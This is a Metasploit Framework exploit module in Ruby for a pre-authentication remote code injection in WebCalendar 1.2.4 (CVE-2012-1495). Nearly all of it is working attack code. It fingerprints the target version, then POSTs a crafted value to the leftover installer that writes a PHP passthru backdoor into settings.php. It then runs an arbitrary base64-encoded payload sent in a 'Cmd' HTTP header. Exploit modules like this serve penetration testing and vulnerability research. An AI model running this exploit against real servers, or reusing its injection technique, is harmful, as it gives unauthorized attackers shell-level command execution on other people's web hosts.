# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "WebCalendar 1.2.4 Pre-Auth Remote Code Injection",
            &#039;Description&#039;    => %q{
                    This modules exploits a vulnerability found in WebCalendar, version 1.2.4 or
                less.  If not removed, the settings.php script meant for installation can be
                update by an attacker, and then inject code in it.  This allows arbitrary code
                execution as www-data.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;EgiX&#039;,   #Initial discovery & PoC
                    &#039;sinn3r&#039;  #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-1495&#039;],
                    [&#039;URL&#039;, &#039;18775&#039;]
                ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
            &#039;Compat&#039;         =>
                {
                    &#039;PayloadType&#039; => &#039;cmd&#039;
                },
            &#039;Targets&#039;        =>
                [
                    [&#039;WebCalendar 1.2.4 on Linux&#039;, {}],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Apr 23 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to webcalendar&#039;, &#039;/WebCalendar-1.2.4/&#039;])
                ], self.class)
    end
 
    def check
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1, 1] != &#039;/&#039;
 
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{uri}/login.php"
        })
 
        if res and res.body =~ /WebCalendar v1.2.\d/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    def exploit
        peer = "#{rhost}:#{rport}"
 
        uri = target_uri.path
        uri << &#039;/&#039; if uri[-1, 1] != &#039;/&#039;
 
        print_status("#{peer} - Housing php payload...")
 
        # Allow commands to be passed as a header.
        # We use &#039;data&#039; instead of &#039;vars_post to avoid the MSF API escapeing our stuff.
        post_data  = "app_settings=1"
        post_data << "&form_user_inc=user.php"
        post_data << "&form_single_user_login=*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;"
        post_data << "\n"*2
        send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => "#{uri}install/index.php",
            &#039;data&#039;      => post_data
        })
 
        print_status("#{peer} - Loading our payload...")
 
        # Execute our payload
        send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{uri}includes/settings.php",
            &#039;headers&#039; => {
                &#039;Cmd&#039; => Rex::Text.encode_base64(payload.encoded)
            }
        })
 
        handler
    end
end



